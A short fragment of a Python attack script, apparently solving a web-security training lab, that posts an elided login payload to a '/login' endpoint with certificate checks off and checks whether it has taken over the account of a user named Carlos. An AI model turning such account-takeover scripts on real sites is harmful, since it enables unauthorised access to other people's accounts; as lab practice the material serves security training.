...
def access_carlos_account(s,url):
    print("✅ Exploiting Carlos's account ...")
    login_url = url + "/login"
    ...
    r = s.post(url = login_url, json = payload, headers = headers, verify=False, proxies=proxies)

    if "Log out" in r.text:
        print("✅ Successfully accessed Carlo's account.")
    else:
